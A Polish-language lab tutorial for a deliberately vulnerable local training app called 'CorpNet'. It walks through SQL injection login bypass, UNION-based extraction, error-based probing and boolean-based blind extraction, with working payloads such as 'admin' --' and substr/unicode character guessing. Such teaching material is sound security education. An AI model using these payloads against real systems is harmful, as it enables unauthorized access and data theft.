# Laboratorium SQL Injection: Aplikacja "CorpNet"

Poniżej znajduje się szczegółowy poradnik krok po kroku, opisujący jak przeprowadzić ataki SQL Injection na specjalnie spreparowaną aplikację. Z zewnątrz wygląda ona jak prawdziwy, nowoczesny system korporacyjny, jednak celowo pozostawiono w niej luki bezpieczeństwa.

> **Pamiętaj: Ataki należy przeprowadzać WYŁĄCZNIE na udostępnionym, lokalnym środowisku testowym (127.0.0.1:5000).**

---

## 1. Portal Pracowniczy - Authentication Bypass (Ominięcie logowania)
**Adres:** `http://127.0.0.1:5000/login`

W tym module formularz logowania buduje zapytanie w sposób niebezpieczny poprzez zwykłe sklejanie (konkatenację) ciągów znaków:
```sql
SELECT * FROM users WHERE username = '[INPUT]' AND password = '[INPUT]'
```

### Jak zaatakować:
W polu **Identyfikator użytkownika** wpisz:
`admin' --`
Zostaw pole **Hasło sieciowe** puste (lub wpisz cokolwiek).

**Dlaczego to działa:**
Apostrof `'` zamyka oczekiwany ciąg znaków w zapytaniu (login). Następnie `--` oznacza w bazie SQLite początek komentarza. Sprawia to, że reszta zapytania (w tym sprawdzanie hasła) zostaje zignorowana przez bazę. Ostateczne zapytanie wykonane w bazie wygląda tak:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```
Dzięki temu logujesz się jako użytkownik `admin` nie znając jego hasła.

*Inny uniwersalny payload do pola login:* `' OR 1=1 --`
Sprawi on, że zalogujesz się na pierwsze konto w tabeli (zazwyczaj jest to admin).

---

## 2. Katalog Produktów - UNION-Based SQL Injection
**Adres:** `http://127.0.0.1:5000/search`

W tym module wyszukiwarka wyświetla na stronie wyniki pochodzące z bazy danych. Zapytanie wygląda tak:
```sql
SELECT name, description, price FROM products WHERE name LIKE '%[INPUT]%'
```

Naszym celem jest odczytanie danych z innej, ukrytej tabeli. Wiemy (lub podejrzewamy), że istnieje tabela `secrets` z kolumną `flag`.

### Jak zaatakować:
1. **Sprawdzamy liczbę kolumn zwracanych przez oryginalne zapytanie.**
Wpisz w wyszukiwarkę: `' ORDER BY 3 --` *(Aplikacja powinna zwrócić wyniki normalnie)*
Wpisz w wyszukiwarkę: `' ORDER BY 4 --` *(Aplikacja przestanie zwracać wyniki, zachowa się jakby nic nie znalazła)*.
**Wniosek:** Oryginalne zapytanie zwraca dokładnie **3 kolumny**.

2. **Wstrzykujemy własne zapytanie za pomocą UNION SELECT.**
Teraz dołączymy nasze zapytanie, używając `UNION SELECT` zwracającego 3 kolumny (ponieważ oryginalne zapytanie też zwraca 3, inaczej byśmy dostali błąd).
Wpisz w wyszukiwarkę:
`' UNION SELECT 1, flag, 3 FROM secrets --`

**Dlaczego to działa:**
`UNION` łączy wyniki z obu zapytań (oryginalnego i naszego). Ponieważ wpisaliśmy znak `'` na początku, wyszliśmy z pola wyszukiwania `LIKE`. Dokleiliśmy nasze zapytanie, które pobiera dane z tabeli `secrets` i umieszcza je w wynikach widocznych na ekranie. Zamiast opisu produktu zobaczysz ukryte flagi.

---

## 3. Katalog Pracowników - Error-Based SQL Injection
**Adres:** `http://127.0.0.1:5000/user_details`

W tym module identyfikator podawany w parametrze URL jest bezpośrednio doklejany do zapytania w formie numerycznej (bez apostrofów).
```sql
SELECT id, username, is_admin FROM users WHERE id = [INPUT]
```
Aplikacja została napisana tak, aby zwracać na ekran bezpośredni błąd wyłapany z bazy (udając błąd systemowy "DATABASE CONNECTOR FATAL ERROR").

### Jak zaatakować:
W polu **Numer ID (CorpID)** wpisz payload zmuszający bazę do wykonania podzapytania, które zwróci błędny typ danych, co zaowocuje błędem zawierającym szukane przez nas dane.

1. **Wymuszamy błąd składni, aby upewnić się o podatności:**
Wpisz: `1' blabla`
Otrzymasz: `unrecognized token: "1'"`

2. **Sprawdzamy nazwy tabel (w SQLite):**
Wpisz: `1 UNION SELECT 1,2,3,4`
Otrzymasz błąd, że tabele nie mają tej samej liczby kolumn: `SELECTs to the left and right of UNION do not have the same number of result columns`. To informuje nas o strukturze.

> **Wskazówka:** W bazie SQLite techniki "Error-Based" pozwalające na kradzież danych w samym komunikacie o błędzie są rzadsze niż w MSSQL. W praktyce ten endpoint najczęściej służy atakującemu do poznania budowy zapytań (ponieważ błędy obnażają logikę, podają nazwy kolumn jeśli użyjemy podzapytań itp.). Głównym celem ataku było by tu spowodowanie błędu konwersji typów jeśli byłoby to wspierane. Możesz również użyć tego pola do wykonania ataku UNION, wpisując po prostu: `1 UNION SELECT 1, flag, 3 FROM secrets`.

---

## 4. Weryfikacja Statusu Konta - Boolean-Based Blind SQL Injection
**Adres:** `http://127.0.0.1:5000/profile`

Aplikacja **nigdy** nie wyświetla danych z bazy ani błędów (są ukrywane). Wyświetla tylko dwa komunikaty:
- ZGŁOSZENIE ZWERYFIKOWANE *(jeśli zapytanie SQL zwróciło rekord)*
- BRAK ZGŁOSZENIA *(jeśli zapytanie nie zwróciło rekordu)*

Zapytanie: 
```sql
SELECT id FROM users WHERE id = [INPUT]
```

### Jak zaatakować:
Wstrzykujemy warunki logiczne i obserwujemy reakcję aplikacji (który komunikat wyświetli). Będziemy odgadywać poszczególne litery pierwszej flagi (załóżmy, że ID flagi w tabeli `secrets` to 1).

1. **Testujemy logikę True/False:**
Wpisz: `1 AND 1=1` -> Wynik: **ZGŁOSZENIE ZWERYFIKOWANE** (Prawda)
Wpisz: `1 AND 1=2` -> Wynik: **BRAK ZGŁOSZENIA** (Fałsz)

2. **Sprawdzamy długość pierwszej flagi:**
Wpisz: `1 AND (SELECT length(flag) FROM secrets WHERE id=1) = 23`
Jeśli flaga ma 23 znaki, aplikacja wyświetli zielony komunikat (Zweryfikowane).

3. **Zgadujemy pierwszą literę flagi:**
Zastosujemy funkcję `SUBSTR` (wycina jeden znak z podanej pozycji) oraz `UNICODE` (zwraca wartość dziesiętną znaku ASCII). Sprawdzimy, czy pierwsza litera to 'F' (co w ASCII wynosi 70).

Wpisz: `1 AND unicode(substr((SELECT flag FROM secrets WHERE id=1), 1, 1)) = 70`
Aplikacja zwróci status zielony! Odgadliśmy pierwszą literę ('F').

Sprawdzamy drugą literę (czy jest to 'L', ASCII 76):
Wpisz: `1 AND unicode(substr((SELECT flag FROM secrets WHERE id=1), 2, 1)) = 76`

Tym sposobem (zazwyczaj używając zautomatyzowanego skryptu) możemy odgadnąć całą zawartość bazy danych nie widząc bezpośrednio żadnego wyniku na ekranie.
